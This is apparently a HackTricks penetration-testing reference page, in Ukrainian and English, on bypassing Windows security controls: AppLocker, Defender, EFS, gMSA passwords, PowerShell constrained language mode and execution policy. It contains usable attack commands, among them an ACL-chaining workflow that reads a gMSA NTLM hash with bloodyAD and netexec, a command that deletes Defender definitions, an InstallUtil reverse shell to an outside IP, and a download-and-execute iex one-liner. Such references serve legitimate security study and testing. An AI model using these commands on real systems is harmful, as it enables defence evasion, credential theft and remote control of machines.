# Контролі безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **рішення для білого списку застосунків** і дає системним адміністраторам контроль над **якими застосунками та файлами користувачі можуть запускати**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами встановлення Windows, DLLs, упакованими додатками та інсталяторими упакованих додатків.\
Звично організації **блокують cmd.exe та PowerShell.exe** і запис прав у певні каталоги, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення занесені в чорний/білий список:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані за допомогою AppLocker, і дає змогу переглянути поточний набір правил, що застосовуються в системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Обхід

- Корисні **папки з правом запису** для обходу AppLocker Policy: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **папки з правом запису**, які ви можете використати, щоб **обійти це**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Зазвичай **довірені** [**"LOLBAS's"**](https://lolbas-project.github.io/) бінарні файли також можуть бути корисні для обходу AppLocker.
- **Погано написані правила також можуть бути обійдені**
- Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, можна створити **папку з назвою `allowed`** будь-де, і вона буде дозволена.
- Організації часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Примусове застосування DLL дуже рідко увімкнене** через додаткове навантаження на систему та обсяг тестування, необхідного, щоб нічого не зламалося. Тому використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** в будь-якому процесі та обійти AppLocker. Для більше інформації див.: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Зберігання облікових даних

### Менеджер облікових записів безпеки (SAM)

Локальні облікові дані присутні в цьому файлі, паролі хешовані.

### Локальний орган безпеки (LSA) - LSASS

**Облікові дані** (хеші) **зберігаються** в **пам'яті** цієї підсистеми з міркувань Single Sign-On.\
**LSA** адмініструє локальну **політику безпеки** (політика паролів, права користувачів...), **аутентифікацію**, **токени доступу**...\
LSA буде тим, хто буде **перевіряти** надані облікові дані в файлі **SAM** (для локального входу) та **спілкуватиметься** з **контролером домену**, щоб автентифікувати доменного користувача.

**Облікові дані** **зберігаються** всередині процесу **LSASS**: Kerberos tickets, хеші NT і LM, легко розшифровувані паролі.

### Секрети LSA

LSA може зберігати на диску деякі облікові дані:

- Пароль облікового запису комп'ютера в Active Directory (коли контролер домену недоступний).
- Паролі облікових записів служб Windows
- Паролі для планових завдань
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Присутня лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — антивірус, який доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені pentesting інструменти, такі як **`WinPEAS`**. Однак існують способи **обійти ці захисти**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Для переліку також можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **File Encryption Key (FEK)**. Цей ключ шифрується за допомогою **публічного ключа** користувача і зберігається в $EFS **альтернативному потоці даних** зашифрованого файлу. Коли потрібне розшифрування, відповідний **приватний ключ** цифрового сертифіката користувача використовується для розшифрування FEK з $EFS потоку. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios without user initiation** include:

- Коли файли або папки переміщуються на файлову систему, що не підтримує EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, відправлені мережею через протокол SMB/CIFS, розшифровуються перед передачею.

Цей метод шифрування дозволяє власнику мати **прозорий доступ** до зашифрованих файлів. Однак просте змінення пароля власника й вхід у систему не забезпечать розшифрування.

**Key Takeaways**:

- EFS використовує симетричний FEK, зашифрований публічним ключем користувача.
- Для розшифрування використовується приватний ключ користувача для доступу до FEK.
- Автоматичне розшифрування відбувається за певних умов, наприклад при копіюванні на FAT32 або при передачі по мережі.
- Зашифровані файли доступні власнику без додаткових кроків.

### Check EFS info

Перевірте, чи **користувач** **використовував** цю **службу**, перевіривши наявність цього шляху:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, використовуючи cipher /c \<file\>
Ви також можете використовувати `cipher /e` та `cipher /d` у папці, щоб **зашифрувати** та **розшифрувати** всі файли

### Decrypting EFS files

#### Маючи права SYSTEM

Цей спосіб вимагає, щоб **жертва-користувач** запускав **процес** на хості. Якщо це так, використовуючи `meterpreter` сесію ви можете імітувати токен процесу користувача (`impersonate_token` з `incognito`). Або ви можете просто `migrate` у процес користувача.

#### Знаючи пароль користувача


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)**, щоб спростити управління сервісними обліковими записами в ІТ-інфраструктурах. На відміну від традиційних сервісних облікових записів, які часто мають увімкнену опцію "**Password never expire**", gMSA пропонують більш безпечне й кероване рішення:

- **Automatic Password Management**: gMSA використовують складний пароль довжиною 240 символів, який автоматично змінюється відповідно до політик домену чи комп'ютера. Цей процес керується Key Distribution Service (KDC) від Microsoft, усуваючи потребу в ручних оновленнях пароля.
- **Enhanced Security**: Ці облікові записи не схильні до блокувань і не можуть використовуватися для інтерактивного входу, що підвищує їх безпеку.
- **Multiple Host Support**: gMSA можуть використовуватися на кількох хостах, що робить їх ідеальними для сервісів, що працюють на кількох серверах.
- **Scheduled Task Capability**: На відміну від managed service accounts, gMSA підтримують виконання планових завдань.
- **Simplified SPN Management**: Система автоматично оновлює Service Principal Name (SPN) при зміні деталей sAMaccount комп'ютера або імені DNS, спрощуючи керування SPN.

Паролі для gMSA зберігаються в LDAP-властивості _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (Domain Controllers, DCs). Цей пароль — зашифрований бінарний блок даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), може бути отриманий лише авторизованими адміністраторами та серверами, на яких встановлені gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з'єднання, таке як LDAPS, або з'єднання має бути автентифіковане з 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ви можете прочитати цей пароль за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перегляньте цю [web page](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack**, щоб **прочитати** **пароль** **gMSA**.

### Зловживання ланцюгуванням ACL для читання керованого пароля gMSA (GenericAll -> ReadGMSAPassword)

У багатьох середовищах користувачі з низькими привілеями можуть отримати доступ до секретів gMSA без компрометації DC, зловживаючи неправильно налаштованими ACL об'єктів:

- Групі, яку ви контролюєте (наприклад, через GenericAll/GenericWrite), надано `ReadGMSAPassword` над gMSA.
- Додавши себе до цієї групи, ви успадковуєте право читати `msDS-ManagedPassword` blob gMSA через LDAP та отримувати придатні NTLM облікові дані.

Типовий робочий процес:

1) Знайдіть шлях за допомогою BloodHound і позначте свої foothold principals як Owned. Шукайте зв'язки на кшталт:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Додайте себе до проміжної групи, яку ви контролюєте (приклад з bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Прочитати керований пароль gMSA через LDAP і отримати NTLM-хеш. NetExec автоматизує витяг `msDS-ManagedPassword` та перетворення в NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
Аутентифікуйтеся як gMSA, використовуючи NTLM hash (plaintext не потрібен). Якщо обліковий запис у Remote Management Users, WinRM працюватиме безпосередньо:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Примітки:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

Рішення **Local Administrator Password Solution (LAPS)**, доступне для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дозволяє керувати локальними паролями облікового запису Administrator. Ці паролі, які є **випадково згенерованими**, унікальними та **регулярно змінюються**, зберігаються централізовано в Active Directory. Доступ до цих паролів обмежується ACLs для авторизованих користувачів. Якщо надані достатні дозволи, можливе читання локальних паролів адміністратора.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **жорстко обмежує багато функцій**, потрібних для ефективного використання PowerShell, таких як блокування COM objects, дозвіл лише схвалених .NET types, XAML-based workflows, PowerShell classes та інше.

### **Перевірте**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```bash
#Easy bypass
Powershell -version 2
```
У сучасних Windows цей Bypass не працює, але ви можете використовувати[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Щоб скомпілювати його, можливо, потрібно** **щоб** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проект на .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) щоб **execute Powershell** code у будь-якому процесі та обійти constrained mode. Для детальнішої інформації див.: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Політика виконання PS

За замовчуванням вона встановлена як **restricted.** Основні способи обійти цю політику:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Детальніше можна знайти [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Інтерфейс Security Support Provider (SSPI)

Це API, який використовується для автентифікації користувачів.

SSPI відповідає за підбір відповідного протоколу для двох машин, які хочуть обмінюватися даними. Переважним методом для цього є Kerberos. Далі SSPI узгоджує, який протокол автентифікації буде використано — ці протоколи автентифікації називаються Security Support Provider (SSP), знаходяться на кожній машині Windows у вигляді DLL, і обидві машини повинні підтримувати один і той самий, щоб мати змогу спілкуватися.

### Основні SSP

- **Kerberos**: The preferred one
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, password in form of a MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
- %windir%\Windows\System32\lsasrv.dll

#### Під час узгодження може бути запропоновано кілька методів або лише один.

## UAC - Контроль облікових записів користувача

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — функція, яка відображає запит на підтвердження для дій з підвищеними правами.

{{#ref}}
uac-user-account-control.md
{{#endref}}

## Посилання

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
